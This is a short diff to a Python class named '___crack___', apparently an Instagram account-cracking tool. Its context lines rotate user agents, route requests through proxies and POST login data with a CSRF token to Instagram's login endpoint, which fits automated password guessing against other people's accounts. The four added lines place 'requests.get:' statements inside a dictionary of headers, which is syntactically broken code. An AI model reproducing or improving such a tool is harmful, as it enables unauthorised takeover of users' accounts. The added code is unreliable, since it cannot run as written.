@@ -436,6 +436,10 @@ class ___crack___:
                 ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                 'X-Requested-With': 'XMLHttpRequest',
                 'Referer': 'https://z-p42.www.instagram.com/accounts/login/',
+                ___roz = requests.get: 'https://i.instagram.com/accounts/login/',
+                ___roz = requests.get: 'https://www.instagram.com/accounts/login/',
+                ___roz = requests.get: 'https://api.instagram.com/accounts/login/',
+                ___roz = requests.get: 'https://i.instagram.com/api/v1/accounts/login/',
                 'x-csrftoken': ___csrf}
                 with requests.Session() as ses:
                     response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
